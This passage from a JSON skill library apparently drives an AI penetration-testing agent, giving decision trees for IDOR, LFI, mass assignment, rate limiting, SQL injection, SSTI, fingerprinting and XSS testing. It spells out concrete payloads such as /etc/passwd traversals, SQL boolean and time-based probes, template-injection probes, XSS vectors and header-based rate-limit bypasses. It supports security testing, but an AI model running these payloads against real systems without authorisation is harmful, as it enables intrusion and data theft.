            "burp_proxy": "Strip or modify authorization headers to test endpoint-level auth checks"
          }
        },
        "techniqueRefs": [
          "access-control-forced-browsing",
          "access-control-missing-function-level",
          "recon-sensitive-file-exposure"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm the accessed resource requires authorization (i.e., it's not publicly intended)",
          "impactAssessment": "Identify what data or functionality is exposed — admin actions, PII, credentials"
        }
      }
    ]
  },
  {
    "id": "idor-check",
    "name": "Idor Check",
    "description": "Test for insecure direct object reference vulnerabilities in resource identifiers",
    "level": "atomic",
    "category": "access-control",
    "ref": "atomic/access-control/idor-check",
    "steps": [
      {
        "id": "idor-check",
        "name": "idor-check",
        "type": "SKILL",
        "skill": "idor-check",
        "ref": "atomic/access-control/idor-check",
        "dependsOn": [],
        "category": "access-control",
        "goal": "Identify IDOR vulnerabilities by manipulating object identifiers in API requests, URLs, and form parameters to access or modify resources belonging to other users. Test both horizontal (same privilege level) and vertical (cross-privilege) access control boundaries.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Identify all numeric IDs, GUIDs, and user-specific identifiers in requests",
            "approach": "Map every parameter that references a resource: /api/user/123, order_id=456, file=abc.pdf",
            "ifPositive": "IDs found — create two test accounts to enable cross-account testing",
            "ifNegative": "No direct IDs visible — check for encoded IDs (base64, hash) in responses",
            "stopWhen": ""
          },
          {
            "action": "With two test accounts, access Account A's resources using Account B's session token",
            "approach": "",
            "ifPositive": "Account B can read Account A's data — horizontal IDOR confirmed",
            "ifNegative": "403 returned — test modification (PUT/PATCH/DELETE) instead of just reads",
            "stopWhen": ""
          },
          {
            "action": "Attempt to modify or delete Account A's resources using Account B's session",
            "approach": "",
            "ifPositive": "Modification/deletion succeeds — write-IDOR confirmed (higher severity)",
            "ifNegative": "Read-only IDOR protected against writes — check for mass assignment in update endpoints",
            "stopWhen": ""
          },
          {
            "action": "Test vertical IDOR: use a low-privilege account to access admin-only resource IDs",
            "approach": "",
            "ifPositive": "Admin resource accessible by regular user — vertical privilege escalation confirmed",
            "ifNegative": "Admin resources properly restricted — IDOR scope limited to horizontal only",
            "stopWhen": ""
          },
          {
            "action": "Test indirect IDOR: change email/username in profile to an existing account's value",
            "approach": "",
            "ifPositive": "Account takeover via indirect IDOR — critical finding",
            "ifNegative": "No additional IDOR vectors — document all tested parameters",
            "stopWhen": "All resource ID parameters tested across both horizontal and vertical boundaries"
          }
        ],
        "toolGuidance": {
          "aiShould": "Systematically map every resource identifier before testing. Maintain two distinct browser sessions simultaneously for cross-account comparison. Sequential integer IDs are highest priority — test ID-1 and ID+1 from your own account ID to find neighbors.",
          "useToolWhen": {
            "burp_proxy": "Replay requests with modified IDs while preserving the other account's session cookie",
            "browser_navigate": "Maintain separate authenticated sessions for each test account"
          }
        },
        "techniqueRefs": [
          "idor-horizontal",
          "idor-vertical",
          "idor-guid-prediction",
          "idor-indirect"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm that the accessed resource belongs to a different user, not a shared resource",
          "impactAssessment": "Determine what sensitive data is exposed: PII, financial records, private messages"
        }
      }
    ]
  },
  {
    "id": "lfi-detect",
    "name": "Lfi Detect",
    "description": "Detect local file inclusion vulnerabilities in path and file parameters",
    "level": "atomic",
    "category": "injection",
    "ref": "atomic/injection/lfi-detect",
    "steps": [
      {
        "id": "lfi-detect",
        "name": "lfi-detect",
        "type": "SKILL",
        "skill": "lfi-detect",
        "ref": "atomic/injection/lfi-detect",
        "dependsOn": [],
        "category": "injection",
        "goal": "Identify local file inclusion vulnerabilities in parameters that reference files or paths on the server. Attempt to read known system files to confirm exploitability, and probe for path traversal sequences that bypass filters.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Identify parameters that look like file references: ?page=, ?file=, ?template=, ?include=",
            "approach": "Any parameter that loads dynamic content by filename is a candidate",
            "ifPositive": "Parameter found — inject traversal sequences targeting /etc/passwd or /etc/hosts",
            "ifNegative": "No file-like parameters visible — check hidden parameters via parameter discovery",
            "stopWhen": ""
          },
          {
            "action": "Inject basic traversal: ../../../etc/passwd and observe response",
            "approach": "",
            "ifPositive": "File content returned — LFI confirmed; note depth and check for RFI",
            "ifNegative": "Error or blank — try encoded variants: ..%2F..%2F, ....//....//,  %252e%252e%252f",
            "stopWhen": ""
          },
          {
            "action": "Try null byte termination and extension bypass: ../../../etc/passwd%00, ../../../etc/passwd%00.jpg",
            "approach": "",
            "ifPositive": "File content returned — LFI confirmed with null byte bypass",
            "ifNegative": "Still blocked — try absolute paths: /etc/passwd, C:\\Windows\\win.ini",
            "stopWhen": ""
          },
          {
            "action": "Test Windows-specific paths if .asp/.aspx/.php+IIS detected: C:\\Windows\\system32\\drivers\\etc\\hosts",
            "approach": "",
            "ifPositive": "Windows hosts file returned — LFI on Windows confirmed",
            "ifNegative": "No LFI confirmed — document as tested, move on",
            "stopWhen": ""
          },
          {
            "action": "If LFI confirmed, attempt to read application source or config files",
            "approach": "",
            "ifPositive": "Document file contents (redacted), path traversal depth, and bypass technique used",
            "ifNegative": "Limited to /etc/passwd — document as confirmed LFI with low sensitivity impact",
            "stopWhen": "Sensitive file content retrieved (credentials, source code, or system file)"
          }
        ],
        "toolGuidance": {
          "aiShould": "Enumerate likely file paths based on the tech stack identified during recon. Try both Unix and Windows paths when OS is unknown. Read response length and content changes to detect blind LFI even without direct output.",
          "useToolWhen": {
            "burp_proxy": "Send traversal payloads and inspect response body for file contents",
            "browser_navigate": "Identify dynamic content-loading parameters in the application"
          }
        },
        "techniqueRefs": [
          "lfi-path-traversal",
          "lfi-null-byte",
          "lfi-wrapper-php",
          "lfi-to-rce-log-poisoning"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Verify that returned content is actually from a server file, not a cached or static resource",
          "impactAssessment": "Attempt to read a configuration file containing credentials or an API key"
        }
      }
    ]
  },
  {
    "id": "mass-assignment",
    "name": "Mass Assignment",
    "description": "Test API write endpoints for mass assignment / auto-binding of privileged fields",
    "level": "atomic",
    "category": "api",
    "ref": "atomic/api/mass-assignment",
    "steps": [
      {
        "id": "mass-assignment",
        "name": "mass-assignment",
        "type": "SKILL",
        "skill": "mass-assignment",
        "ref": "atomic/api/mass-assignment",
        "dependsOn": [],
        "category": "api",
        "goal": "Identify mass-assignment (API6:2023 / auto-binding) where an object-creation or update endpoint binds request fields directly to the model, letting a caller set attributes they should not control (role, isAdmin, balance, verified, owner_id, price).",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Capture a legitimate create/update request and read the object's full representation from a GET to learn all its fields",
            "approach": "Compare the fields the UI sends on write vs the fields present in the read response — the difference is the candidate set",
            "ifPositive": "Read exposes fields the write form never sends (role, isAdmin, credit) — candidate injection fields found",
            "ifNegative": "No extra fields visible — probe common privileged names anyway (isAdmin, is_admin, role, verified, owner, status)",
            "stopWhen": ""
          },
          {
            "action": "Resend the write request adding the candidate privileged field(s) with an attacker-favourable value",
            "approach": "",
            "ifPositive": "Server accepts and the follow-up GET reflects the injected value — mass assignment confirmed",
            "ifNegative": "Field ignored or rejected — try nested paths (user.role), array/object wrappers, and alternate content types (JSON vs form)",
            "stopWhen": ""
          },
          {
            "action": "Test on both create (POST) and update (PUT/PATCH) — update endpoints often bind more loosely",
            "approach": "",
            "ifPositive": "Privileged field bound on update — confirm the effect (elevated role, altered balance, changed ownership)",
            "ifNegative": "Both guarded — test field name casing and framework aliases (snake vs camel, GraphQL input types)",
            "stopWhen": ""
          },
          {
            "action": "Verify real impact, not just echo: re-authenticate or re-fetch to confirm the privileged state actually took effect",
            "approach": "",
            "ifPositive": "Record endpoint, injected field, before/after object state, and the resulting privilege change",
            "ifNegative": "Values echoed but not persisted/effective — note as non-exploitable",
            "stopWhen": "All write endpoints tested with the candidate privileged-field set"
          }
        ],
        "toolGuidance": {
          "aiShould": "Derive the candidate fields from the object's own read representation and from framework conventions — do not blind-fuzz. The finding is not that the server accepted an extra field, but that the extra field changed privileged state; always confirm with a fresh read. Reason about the backend framework (Rails/Django/Express/Spring) to predict binding behaviour and field names.",
          "useToolWhen": {
            "burp_proxy": "Replay write requests with added fields and inspect the persisted object via a follow-up read",
            "curl": "Iterate candidate field names and content types quickly"
          }
        },
        "techniqueRefs": [
          "mass-assignment",
          "api-object-property-abuse"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm the injected field is genuinely privileged and not a normal user-editable attribute",
          "impactAssessment": "Show the concrete effect: privilege escalation, financial change, ownership takeover, or verification bypass"
        }
      }
    ]
  },
  {
    "id": "rate-limit-check",
    "name": "Rate Limit Check",
    "description": "Test API endpoints for missing or bypassable rate limiting (API4:2023 resource consumption)",
    "level": "atomic",
    "category": "api",
    "ref": "atomic/api/rate-limit-check",
    "steps": [
      {
        "id": "rate-limit-check",
        "name": "rate-limit-check",
        "type": "SKILL",
        "skill": "rate-limit-check",
        "ref": "atomic/api/rate-limit-check",
        "dependsOn": [],
        "category": "api",
        "goal": "Determine whether sensitive API operations (login, OTP/2FA, password reset, token issuance, expensive queries, messaging) enforce effective rate limiting, and whether any limit that exists can be trivially bypassed. Focus on security-relevant endpoints where the absence of a limit enables abuse.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Identify security-sensitive endpoints (auth, OTP, reset, invite, search/export, payment) and send a controlled burst to each",
            "approach": "Send a modest, bounded burst (e.g. 30-50 requests) and watch for 429, Retry-After, or throttling headers — do NOT run credential brute force unless the engagement allows it",
            "ifPositive": "429/Retry-After appears — a limit exists; proceed to bypass testing",
            "ifNegative": "No throttling after the burst — missing rate limit; record the endpoint and observed throughput",
            "stopWhen": ""
          },
          {
            "action": "If a limit exists, test per-key bypasses: rotate IP via X-Forwarded-For/X-Real-IP, vary casing/trailing slash, add cache-buster params",
            "approach": "",
            "ifPositive": "Header/path variation resets the counter — limit is client-controllable, effectively bypassable",
            "ifNegative": "Limit holds across variations — test account/session dimension next",
            "stopWhen": ""
          },
          {
            "action": "Test the limit's dimension: is it per-IP, per-account, or global? Spread requests across sessions/accounts",
            "approach": "",
            "ifPositive": "Limit is per-IP only — distributed or multi-account abuse bypasses it for account-targeting attacks",
            "ifNegative": "Limit is per-account and enforced server-side — note as adequately controlled",
            "stopWhen": ""
          },
          {
            "action": "For OTP/2FA and reset flows specifically, verify the code-verification step is limited (not just the send step)",
            "approach": "",
            "ifPositive": "Verification step unlimited — enables OTP/token brute force; flag high severity",
            "ifNegative": "Verification limited and lockout enforced — document the control",
            "stopWhen": "Sensitive endpoints assessed for presence, dimension, and bypassability of limits"
          }
        ],
        "toolGuidance": {
          "aiShould": "Keep bursts bounded and respect the engagement config — this check probes for the ABSENCE of a limit, it is not a brute-force attack. Reason about the limit's dimension (IP vs account vs global) because that determines real exploitability. Prioritise endpoints where missing limits cause concrete harm: OTP/2FA verification, password reset, login, and expensive queries.",
          "useToolWhen": {
            "curl": "Send a bounded, counted burst and record status codes / Retry-After timing",
            "burp_proxy": "Replay with rotated forwarding headers and varied paths to test counter bypass"
          }
        },
        "techniqueRefs": [
          "rate-limit-bypass",
          "otp-brute-window",
          "resource-exhaustion"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm the endpoint is security-sensitive and the observed throughput is genuinely unthrottled, not just a high ceiling",
          "impactAssessment": "Tie the gap to an abuse case: OTP/token brute force, account lockout DoS, cost amplification, or enumeration"
        }
      }
    ]
  },
  {
    "id": "sqli-form",
    "name": "Sqli Form",
    "description": "Test HTML form inputs for SQL injection vulnerabilities",
    "level": "atomic",
    "category": "injection",
    "ref": "atomic/injection/sqli-form",
    "steps": [
      {
        "id": "sqli-form",
        "name": "sqli-form",
        "type": "SKILL",
        "skill": "sqli-form",
        "ref": "atomic/injection/sqli-form",
        "dependsOn": [],
        "category": "injection",
        "goal": "Identify SQL injection vulnerabilities in form-based inputs by sending error-triggering payloads, boolean-based probes, and time-based blind payloads. Confirm exploitability and determine database type.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Send a single quote ' to each form field and observe server response",
            "approach": "Start with the simplest error-triggering probe",
            "ifPositive": "SQL error returned — confirm injectable parameter, proceed to extract DB type",
            "ifNegative": "No error — try boolean-based probes",
            "stopWhen": ""
          },
          {
            "action": "Send boolean payloads: ' OR '1'='1 and ' OR '1'='2",
            "approach": "",
            "ifPositive": "Different responses confirm blind SQLi — proceed to time-based confirmation",
            "ifNegative": "Responses identical — try time-based blind injection",
            "stopWhen": ""
          },
          {
            "action": "Send time-based payload: '; WAITFOR DELAY '0:0:5'-- (MSSQL) or SLEEP(5) (MySQL)",
            "approach": "",
            "ifPositive": "Delay observed — confirmed blind time-based SQLi, record DB type and parameter",
            "ifNegative": "No delay — input may be filtered or not injectable; move on",
            "stopWhen": ""
          },
          {
            "action": "If injectable, determine DB type via error messages or DBMS-specific syntax probes",
            "approach": "",
            "ifPositive": "DB type identified — hand off to sqlmap for full exploitation",
            "ifNegative": "DB type unclear — try generic ORDER BY probes to count columns",
            "stopWhen": ""
          },
          {
            "action": "Validate finding: reproduce with a fresh request confirming consistent behavior",
            "approach": "",
            "ifPositive": "Document parameter, payload, evidence screenshot, response diff",
            "ifNegative": "Inconsistent — mark as low-confidence, note for manual review",
            "stopWhen": "Finding confirmed reproducible with at least 2 distinct payloads"
          }
        ],
        "toolGuidance": {
          "aiShould": "Craft and send payloads directly using the HTTP proxy tool. Read error messages and response diffs to infer DB type and injection context. Reason about WAF evasion if simple payloads are blocked. Only hand off to sqlmap once a vulnerable parameter is confirmed.",
          "useToolWhen": {
            "burp_proxy": "Send individual payloads and inspect raw HTTP responses",
            "sqlmap": "Confirmed injectable parameter — full dump, schema extraction, or auth bypass",
            "browser_navigate": "Load the target form to identify all input fields before testing"
          }
        },
        "techniqueRefs": [
          "sqli-error-based",
          "sqli-boolean-blind",
          "sqli-time-blind",
          "sqli-union-based"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Verify the parameter is actually processed by a DB query, not just reflected",
          "impactAssessment": "Attempt to extract one table name or DB version as proof of exploitability"
        }
      }
    ]
  },
  {
    "id": "ssti-detect",
    "name": "Ssti Detect",
    "description": "Detect server-side template injection in user-controlled inputs",
    "level": "atomic",
    "category": "injection",
    "ref": "atomic/injection/ssti-detect",
    "steps": [
      {
        "id": "ssti-detect",
        "name": "ssti-detect",
        "type": "SKILL",
        "skill": "ssti-detect",
        "ref": "atomic/injection/ssti-detect",
        "dependsOn": [],
        "category": "injection",
        "goal": "Identify server-side template injection by injecting template expression probes into inputs that appear in rendered output. Determine the template engine in use and confirm code execution potential via arithmetic evaluation.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Inject arithmetic probe {{7*7}} into each input that appears reflected in rendered output",
            "approach": "If the response contains 49 rather than the literal string, SSTI is confirmed",
            "ifPositive": "49 returned — Jinja2/Twig/similar confirmed; proceed to engine fingerprinting",
            "ifNegative": "Literal reflected or no reflection — try ${7*7} for Freemarker/Thymeleaf",
            "stopWhen": ""
          },
          {
            "action": "Try ${7*7} and #{7*7} for Java-based template engines",
            "approach": "",
            "ifPositive": "49 returned — Java template engine (Freemarker, Velocity, Thymeleaf) confirmed",
            "ifNegative": "Try <#assign x=7*7>${x} for Freemarker specifically",
            "stopWhen": ""
          },
          {
            "action": "Fingerprint template engine using engine-specific syntax probes",
            "approach": "",
            "ifPositive": "Engine identified — prepare engine-specific RCE payload",
            "ifNegative": "Engine unclear — document arithmetic execution as confirmed SSTI without engine ID",
            "stopWhen": ""
          },
          {
            "action": "Attempt RCE validation: use engine-specific payload to read /etc/passwd or run id command",
            "approach": "",
            "ifPositive": "Full RCE confirmed — document payload chain and stop (critical finding)",
            "ifNegative": "No RCE — sandbox may be active; document as SSTI with limited impact",
            "stopWhen": "Command output returned in response confirms RCE via SSTI"
          }
        ],
        "toolGuidance": {
          "aiShould": "Reason carefully about which template engine is likely based on the application technology stack identified during recon. Start with the polyglot probe ${{<%['\"}}%> to trigger errors that reveal the engine. Do not attempt RCE without first confirming arithmetic evaluation.",
          "useToolWhen": {
            "burp_proxy": "Send template probes and inspect response body for evaluation results",
            "browser_navigate": "Identify technology stack and template rendering context"
          }
        },
        "techniqueRefs": [
          "ssti-jinja2",
          "ssti-freemarker",
          "ssti-twig",
          "ssti-rce-chain"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Verify arithmetic result is from server evaluation, not client-side JavaScript",
          "impactAssessment": "Attempt to read server environment variables or execute a harmless OS command"
        }
      }
    ]
  },
  {
    "id": "tech-stack-fingerprint",
    "name": "Tech Stack Fingerprint",
    "description": "Identify the technology stack, framework versions, and server components",
    "level": "atomic",
    "category": "recon",
    "ref": "atomic/recon/tech-stack-fingerprint",
    "steps": [
      {
        "id": "tech-stack-fingerprint",
        "name": "tech-stack-fingerprint",
        "type": "SKILL",
        "skill": "tech-stack-fingerprint",
        "ref": "atomic/recon/tech-stack-fingerprint",
        "dependsOn": [],
        "category": "recon",
        "goal": "Determine the full technology stack of the target including web server, backend language, framework, database indicators, and CDN/WAF presence. This information drives payload selection for all subsequent tests.",
        "intrusive": false,
        "decisionTree": [
          {
            "action": "Read HTTP response headers: Server, X-Powered-By, X-Generator, Via, Set-Cookie",
            "approach": "Headers often reveal server version, framework, and infrastructure",
            "ifPositive": "Technology identified — record versions and check for known CVEs",
            "ifNegative": "Headers stripped or generic — move to fingerprinting via behavior",
            "stopWhen": ""
          },
          {
            "action": "Check error pages by requesting a non-existent path and malformed input",
            "approach": "",
            "ifPositive": "Default error page reveals framework (Django 404, Spring Whitelabel, PHP Notice)",
            "ifNegative": "Custom error pages — try HTTP/1.0 request, OPTIONS method for further probing",
            "stopWhen": ""
          },
          {
            "action": "Inspect cookie names: PHPSESSID=PHP, JSESSIONID=Java, ASP.NET_SessionId=ASP.NET, _session=Rails",
            "approach": "",
            "ifPositive": "Cookie name identifies backend language — update tech stack record",
            "ifNegative": "Generic cookie name — analyze JS files for framework-specific signatures",
            "stopWhen": ""
          },
          {
            "action": "Read page source and JS files for framework signatures: ng-version, __NEXT_DATA__, wp-content, Drupal.settings",
            "approach": "",
            "ifPositive": "Frontend framework identified — check for known client-side vulns",
            "ifNegative": "No signatures — use Wappalyzer data or favicon hash matching",
            "stopWhen": ""
          },
          {
            "action": "Check for WAF indicators: unusual headers, blocked probe responses, Cloudflare/Akamai signatures",
            "approach": "",
            "ifPositive": "WAF detected — note vendor and adapt payload encoding for subsequent tests",
            "ifNegative": "No WAF detected — proceed with standard payloads",
            "stopWhen": "Full stack identified: web server + language + framework + DB indicator + WAF status"
          }
        ],
        "toolGuidance": {
          "aiShould": "Synthesize all fingerprinting signals into a definitive tech stack profile. Note version numbers for CVE correlation. Flag any end-of-life components as high-priority targets. Update the recon summary with WAF presence.",
          "useToolWhen": {
            "browser_navigate": "Load the application and inspect headers, cookies, and page source",
            "burp_proxy": "Capture full request/response headers for all fingerprinting probes"
          }
        },
        "techniqueRefs": [
          "recon-header-analysis",
          "recon-error-page-fingerprint",
          "recon-cookie-analysis",
          "recon-waf-detect"
        ],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "Cross-reference at least 2 independent signals before confirming a technology",
          "impactAssessment": "Identify any end-of-life or CVE-affected component versions"
        }
      }
    ]
  },
  {
    "id": "xss-dom",
    "name": "Xss Dom",
    "description": "Test client-side code for DOM-based cross-site scripting vulnerabilities",
    "level": "atomic",
    "category": "injection",
    "ref": "atomic/injection/xss-dom",
    "steps": [
      {
        "id": "xss-dom",
        "name": "xss-dom",
        "type": "SKILL",
        "skill": "xss-dom",
        "ref": "atomic/injection/xss-dom",
        "dependsOn": [],
        "category": "injection",
        "goal": "Identify DOM-based XSS where untrusted data flows from a client-side source (location, document.referrer, postMessage, storage) into a dangerous sink (innerHTML, eval, document.write, setAttribute) without sanitisation. The payload never needs to reach the server — reason about the JavaScript.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Read the page's JavaScript and identify sources (location.hash/search, document.referrer, window.name, localStorage, postMessage)",
            "approach": "Grep loaded JS for source reads and follow the variable to where it is used",
            "ifPositive": "A source value flows toward a sink — trace the full data flow",
            "ifNegative": "No client-side source reaches a sink — DOM XSS unlikely; move on",
            "stopWhen": ""
          },
          {
            "action": "Identify sinks the tainted value reaches (innerHTML, outerHTML, document.write, eval, Function, setAttribute, jQuery .html())",
            "approach": "",
            "ifPositive": "Tainted source reaches a sink unsanitised — craft a source-specific payload",
            "ifNegative": "Value is sanitised/encoded before the sink — test framework-specific bypasses (e.g. Angular/Vue template injection)",
            "stopWhen": ""
          },
          {
            "action": "Inject via the source: e.g. #<img src=x onerror=alert(document.domain)> in location.hash, or a crafted postMessage",
            "approach": "",
            "ifPositive": "Sink executes the payload in the DOM — DOM XSS confirmed",
            "ifNegative": "Browser encodes the fragment — try encodings that survive the specific sink (e.g. no server round-trip means URL-decoding happens client-side)",
            "stopWhen": ""
          },
          {
            "action": "For postMessage sinks, send a message from an attacker-controlled origin and check the handler validates origin",
            "approach": "",
            "ifPositive": "Record the source, sink, exact URL/fragment or postMessage, and screenshot of execution",
            "ifNegative": "Handler validates origin/type — note the control and move on",
            "stopWhen": "Payload executes purely client-side with no server reflection"
          }
        ],
        "toolGuidance": {
          "aiShould": "This is a code-reading task first, not a fuzzing task. Read the JavaScript, build the source-to-sink data-flow map, then craft the payload. The payload lives in the fragment/hash or a postMessage, so it may never appear in server logs. Distinguish DOM XSS from reflected XSS by confirming the value is written to the DOM by client JS, not by the server response.",
          "useToolWhen": {
            "browser_navigate": "Load the page with the crafted source value (hash/query) to trigger the sink",
            "browser_evaluate": "Inspect the DOM and confirm the tainted value reached the sink; trace sources at runtime",
            "burp_proxy": "Confirm the payload is NOT in the server response (proving it is DOM-based, not reflected)"
          }
        },
        "techniqueRefs": [
          "xss-dom-based",
          "xss-postmessage",
          "xss-context-escape"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm the injection executes via a client-side sink and does not appear in the server-rendered HTML",
          "impactAssessment": "Demonstrate script execution in the target origin (document.domain, cookie, or session access)"
        }
      }
    ]
  },
  {
    "id": "xss-reflected",
    "name": "Xss Reflected",
    "description": "Test inputs for reflected cross-site scripting vulnerabilities",
    "level": "atomic",
    "category": "injection",
    "ref": "atomic/injection/xss-reflected",
    "steps": [
      {
        "id": "xss-reflected",
        "name": "xss-reflected",
        "type": "SKILL",
        "skill": "xss-reflected",
        "ref": "atomic/injection/xss-reflected",
        "dependsOn": [],
        "category": "injection",
        "goal": "Identify reflected XSS vulnerabilities by injecting probe strings into URL parameters, form fields, and HTTP headers, then confirming unescaped reflection in the HTML response. Determine execution context and craft a working PoC payload.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Inject a unique alphanumeric canary string into each input and check if it reflects unescaped in the response",
            "approach": "Use a string like xssCANARY123 first — no angle brackets, just confirm reflection exists",
            "ifPositive": "Canary reflects — determine the HTML context (attribute, tag body, JS, URL)",
            "ifNegative": "No reflection — input may not be reflected at all; skip this parameter",
            "stopWhen": ""
          },
          {
            "action": "Inject context-appropriate XSS probe based on reflection context",
            "approach": "",
            "ifPositive": "Probe reflected without encoding — try full <script>alert(1)</script> or context variant",
            "ifNegative": "Characters encoded — test alternate encodings: hex, HTML entities, JSFuck, template literals",
            "stopWhen": ""
          },
          {
            "action": "Test HTTP headers: Referer, X-Forwarded-For, User-Agent for reflection in error pages",
            "approach": "",
            "ifPositive": "Header value reflected — craft header-based XSS payload",
            "ifNegative": "Headers not reflected in output — skip header-based vectors",
            "stopWhen": ""
          },
          {
            "action": "Confirm execution: verify payload triggers in browser or via DOM inspection",
            "approach": "",
            "ifPositive": "Record full payload, parameter name, GET/POST method, and screenshot of execution",
            "ifNegative": "Payload reflected but not executing — check CSP headers, note as partial finding",
            "stopWhen": "alert()/console.log()/document.domain confirmed executing in target origin"
          }
        ],
        "toolGuidance": {
          "aiShould": "Reason about the HTML context from reflection point before choosing a payload. Read CSP headers and adjust payload if script-src blocks inline scripts. Try DOM-based vectors if server-side reflection is absent.",
          "useToolWhen": {
            "burp_proxy": "Send payloads and inspect raw HTML response for reflection analysis",
            "browser_navigate": "Confirm execution context and test DOM-based XSS vectors",
            "browser_evaluate": "Check if payload executed in browser DOM"
          }
        },
        "techniqueRefs": [
          "xss-reflected",
          "xss-dom-based",
          "xss-context-escape"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm origin of reflected output — server-rendered vs JS-injected into DOM",
          "impactAssessment": "Demonstrate session hijack potential by reading document.cookie or document.domain"
        }
      }
    ]
  },
  {
    "id": "xss-stored",
    "name": "Xss Stored",
    "description": "Test inputs for stored (persistent) cross-site scripting vulnerabilities",
    "level": "atomic",
    "category": "injection",
    "ref": "atomic/injection/xss-stored",
    "steps": [
      {
        "id": "xss-stored",
        "name": "xss-stored",
        "type": "SKILL",
        "skill": "xss-stored",
        "ref": "atomic/injection/xss-stored",
        "dependsOn": [],
        "category": "injection",
        "goal": "Identify stored XSS by submitting probe payloads into fields that are persisted and later rendered to other users (comments, profiles, messages, filenames, support tickets). Confirm the payload executes when the stored content is viewed, and determine which viewers are affected.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Map every input that gets persisted and re-displayed, then submit a unique canary (e.g. stCANARY123) into each",
            "approach": "Prioritise fields shown to OTHER users or admins — comments, display name, ticket body, uploaded filenames",
            "ifPositive": "Canary appears on a view page — note where it renders and to whom",
            "ifNegative": "Canary never re-displays — field may not be stored or is shown only to the submitter; deprioritise",
            "stopWhen": ""
          },
          {
            "action": "On the render page, determine the HTML context of the stored canary and inject a context-appropriate payload",
            "approach": "",
            "ifPositive": "Payload stored unescaped — try <script>alert(document.domain)</script> or a context variant",
            "ifNegative": "Output encoded on render — test alternate encodings and mutation-XSS (mXSS) via innerHTML sinks",
            "stopWhen": ""
          },
          {
            "action": "Check second-order sinks: values echoed into admin dashboards, logs, exported reports, or email templates",
            "approach": "",
            "ifPositive": "Stored value reaches a privileged view — flag as high impact (targets admins)",
            "ifNegative": "No privileged sink found — scope impact to same-role viewers",
            "stopWhen": ""
          },
          {
            "action": "Confirm execution by loading the render page in a clean browser session",
            "approach": "",
            "ifPositive": "Record submit request, render URL, affected audience, and a screenshot of execution",
            "ifNegative": "Stored but not executing — check CSP; note as partial finding",
            "stopWhen": "alert()/document.domain fires when the stored content is viewed"
          }
        ],
        "toolGuidance": {
          "aiShould": "Trace the full path from submission to render — the injection point and the execution point are different pages. Reason about who sees the render page, since stored XSS that hits admins is far more severe than self-only. Watch for encoding that differs between the input echo and the stored render.",
          "useToolWhen": {
            "burp_proxy": "Submit the payload and inspect the persisted value in the raw render response",
            "browser_navigate": "Load the render page in a fresh session to confirm execution against another viewer",
            "browser_evaluate": "Verify the payload executed in the DOM of the render page"
          }
        },
        "techniqueRefs": [
          "xss-stored",
          "xss-context-escape",
          "xss-mutation"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm the payload persists across sessions and renders to a different user than the submitter",
          "impactAssessment": "Identify the affected audience (public/other-users/admins) and demonstrate cookie or session access"
        }
      }
    ]
  }
];
